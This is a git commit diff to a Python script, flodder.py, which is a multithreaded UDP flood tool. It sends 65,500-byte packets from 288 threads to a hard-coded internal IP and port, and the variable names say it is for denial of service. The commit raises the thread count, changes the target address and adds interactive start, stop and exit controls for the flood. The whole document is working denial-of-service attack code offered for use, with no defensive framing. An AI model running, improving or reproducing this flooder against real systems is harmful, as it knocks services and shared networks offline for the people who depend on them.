a5c720002f1b44911dd25771547d03c196d32e18
Daniel Robson <10593293@student.bpc.internal>
2017-03-28 09:50:05 +0100

    .

--- flodder.py
+++ flodder.py
@@ -2,15 +2,16 @@ import socket
 import time
 import thread
 import threading
-udp_id_addr = "172.18.103.86"
+udp_id_addr = "172.18.103.97"
 udp_port_no = 21299
 send_buff = "N" * 65500
 send_delay = None
-worker_count = 188
+worker_count = 288
 sock = None
 lock = threading.Lock()
 active_workers = 0
 dos_inprog = 0
+wk_active = 0
 
 def add_wk():
 	global active_workers
@@ -18,7 +19,7 @@ def add_wk():
 	active_workers += 1
 	lock.release()
 	
-def rm_rk():
+def rm_wk():
 	global active_workers
 	lock.acquire()
 	active_workers -= 1
@@ -29,17 +30,20 @@ def worker(wk_id):
 	print("worker with the id of %d is now active.\n" % (wk_id))
 	add_wk()
 	try:
-		while(dos_inprog):
-			sock.sendto(send_buff, (udp_id_addr, udp_port_no))
-			if (send_delay != None):
-				time.sleep(send_delay)
+		while(wk_active):
+			while(dos_inprog):
+				sock.sendto(send_buff, (udp_id_addr, udp_port_no))
+				if (send_delay != None):
+					time.sleep(send_delay)
 	except Exception:
 		print("theres seems of been an error.\n")
-	rm_rk()
+	rm_wk()
+	print("worker with the id of %d is now dead.\n" % (wk_id))
 	thread.exit()
 			
 if __name__ == "__main__":
 	dos_inprog = 1
+	wk_active = 1
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	for x in range(0, worker_count):
 		try:
@@ -54,15 +58,23 @@ if __name__ == "__main__":
 		print(active_workers)
 		if (active_workers == worker_count): break
 	print("all workers are avtive.")
-	
+
 	while(1):
 		if (active_workers == 0): break
 		cmd = raw_input("please enter your command.\n")
-		if (cmd == "stop"):
+		if (cmd == "exit"):
 			dos_inprog = 0
+			wk_active = 0
 			print("waiting for workers to shutdown.")
 			while(active_workers != 0):
 				None
 			print("all workers have been shutdown.")
 			break
+		if (cmd == "stop"):
+			print("stopping all workers.")
+			dos_inprog = 0
+		if (cmd == "start"):
+			print("starting all workers.")
+			dos_inprog = 1
+			
 	socket.close(sock)
